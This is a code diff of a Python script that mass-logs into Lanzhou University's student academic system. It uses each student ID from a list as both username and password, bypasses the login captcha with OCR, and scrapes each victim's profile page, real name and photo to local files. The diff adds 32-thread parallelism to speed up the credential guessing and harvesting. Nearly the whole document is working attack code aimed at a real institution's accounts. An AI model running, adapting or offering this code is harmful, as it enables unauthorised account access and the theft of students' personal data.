@@ -1,4 +1,4 @@
-﻿#coding = utf-8
+﻿# -*- coding:utf-8 -*-
 # by 'hollowman6' from Lanzhou University(兰州大学)
 
 '''
@@ -12,6 +12,8 @@ I will not be responsible for any adverse consequences caused by using this code
 
 '''
 
+# 多线程 Multithreading
+import threading
 # 图像处理 Image processing
 from PIL import Image
 # 文件处理 File processing
@@ -89,72 +91,98 @@ class qdujw:
         }
 
     # 教务系统登录 Login STU-INFO System
-    def login(self):
-        global sid, passwd
+    def login(self, sid, passwd):
         # 页面相关设置 Page Related Settings
         loginurl = 'http://jwk.lzu.edu.cn/academic/j_acegi_security_check'
         codeurl = 'http://jwk.lzu.edu.cn/academic/getCaptcha.do'
         userurl = 'http://jwk.lzu.edu.cn/academic/student/studentinfo/studentInfoModifyIndex.do?frombase=0&wantTag=0&groupId=&moduleId=2060'
+        try:
+            # 验证码 Captcha
+            code = self.s.get(codeurl, headers=self.headers, stream=True)
+            codetext = OCR_lmj(io.BytesIO(code.content))
 
-        # 验证码 Captcha
-        code = self.s.get(codeurl, headers=self.headers, stream=True)
-        codetext = OCR_lmj(io.BytesIO(code.content))
+            # 验证码识别长度符合要求 The length of captcha recognized is fitted
+            if len(codetext) >= 4 and len(codetext) <= 6:
 
-        # 验证码识别长度符合要求 The length of captcha recognized is fitted
-        if len(codetext) == 5:
+                # 登录 Login
+                postdata = {
+                    'j_username': sid,
+                    'j_password': passwd,
+                    'j_captcha': codetext
+                }
+                r = self.s.post(loginurl, postdata)
 
-            # 登录 Login
-            postdata = {
-                'j_username': sid,
-                'j_password': passwd,
-                'j_captcha': codetext
-            }
-            r = self.s.post(loginurl, postdata)
+                # 验证码错误 Wrong Captcha
+                if re.search(u'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e', r.text):
+                    qdujw().login(sid, passwd)
 
-            # 验证码错误 Wrong Captcha
-            if re.search(u'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e', r.text):
-                qdujw().login()
-
-            # 验证码匹配成功 Captcha matched
-            else:
-                userpage = self.s.get(userurl).content
-                gbcontent = str(userpage.decode('gb2312', 'ignore'))
-                nw = open("latest.txt", 'w')
-                nw.write(sid)
-                if "权限不够,访问被拒绝" in gbcontent:  # Refuse to access
-                    print(sid+"失败！")  # Fail
+                # 验证码匹配成功 Captcha matched
                 else:
-                    imageid = ''.join(re.findall(
-                        r'"/academic/manager/studentinfo/showStudentImage.jsp?id=(.+?)"', gbcontent))
-                    imagepage = "http://jwk.lzu.edu.cn/academic/manager/studentinfo/showStudentImage.jsp?id="+imageid
-                    name = ''.join(re.findall(r'name="realname" value="(.+?)"',
-                                              str(userpage.decode('utf-8', 'ignore'))))
-                    image = self.s.get(imagepage).content
-                    # 写入文件 Write file
-                    wf = open("data/"+name+sid.replace("\n", '')+'.html', 'wb')
-                    wi = open("data/"+name+sid.replace("\n", '')+'.jpg', 'wb')
-                    fw = open("success.txt", 'a')
-                    wf.write(userpage)
-                    wi.write(image)
-                    fw.write(sid)
-                    wi.close()
-                    wf.close()
-                    fw.close()
-                    print(sid+"成功！已保存到本地！")  # Success, saved locally
-                nw.close()
-        else:
-            qdujw().login()
+                    userpage = self.s.get(userurl).content
+                    gbcontent = str(userpage.decode('gb2312', 'ignore'))
+                    if "权限不够,访问被拒绝" in gbcontent:  # Refuse to access
+                        print(sid+"失败！")  # Fail
+                    else:
+                        imageid = ''.join(re.findall(
+                            r'"/academic/manager/studentinfo/showStudentImage.jsp?id=(.+?)"', gbcontent))
+                        imagepage = "http://jwk.lzu.edu.cn/academic/manager/studentinfo/showStudentImage.jsp?id="+imageid
+                        name = ''.join(re.findall(r'name="realname" value="(.+?)"',
+                                                  str(userpage.decode('utf-8', 'ignore'))))
+                        image = self.s.get(imagepage).content
+                        # 写入文件 Write file
+                        wf = open("data/"+name +
+                                  sid.replace("\n", '')+'.html', 'wb')
+                        wf.write(userpage)
+                        wf.close()
+                        wi = open("data/"+name +
+                                  sid.replace("\n", '')+'.jpg', 'wb')
+                        wi.write(image)
+                        wi.close()
+                        # 上锁，第一个线程如果申请到锁，会在执行公共数据的过程中持续阻塞后续线程
+                        # 即后续第二个或其他线程依次来了发现已经被上锁，只能等待第一个线程释放锁
+                        # 当第一个线程将锁释放，后续的线程会进行争抢
+                        # Lock. If the first thread applies for a lock, it will continue to block subsequent threads while executing public data.
+                        # That is, the next second or other thread comes in turn and finds that it has been locked and can only wait for the first thread to release the lock.
+                        # When the first thread releases the lock, subsequent threads compete.
+                        lock.acquire()
+                        nw = open("latest.txt", 'w')
+                        nw.write(sid)
+                        nw.close()
+                        fw = open("success.txt", 'a')
+                        fw.write(sid)
+                        fw.close()
+                        print(sid+"成功！已保存到本地！")  # Success, saved locally
+                        # 释放锁 Release lock
+                        lock.release()
+                        # 释放信号量，可用信号量加一 Release semaphores, add one semaphore
+                        threadmax.release()
+
+            else:
+                qdujw().login(sid, passwd)
+        except Exception:
+            pass
 
 
+dlist = []
 # 打开数据文件 Open data files
 f = open("list.txt")
 line = f.readline()
 while line:
-    sid = line
-    passwd = line
-    try:
-        qdujw().login()
-    except Exception:
-        pass
+    dlist.append(line)
     line = f.readline()
 f.close()
+# 使用多线程 Using multithreading
+
+# 限制线程的最大数量为32个 The maximum number of restricted threads is 32
+threadmax = threading.BoundedSemaphore(32)
+# 将锁内的代码串行化 Serialization of code in locks
+lock = threading.Lock()
+l = []
+for line in dlist:
+    # 增加信号量，可用信号量减一 Increase the semaphore and subtract one from the semaphore
+    threadmax.acquire()
+    t = threading.Thread(target=qdujw().login, args=(line, line))
+    t.start()
+    l.append(t)
+for t in l:
+    t.join()
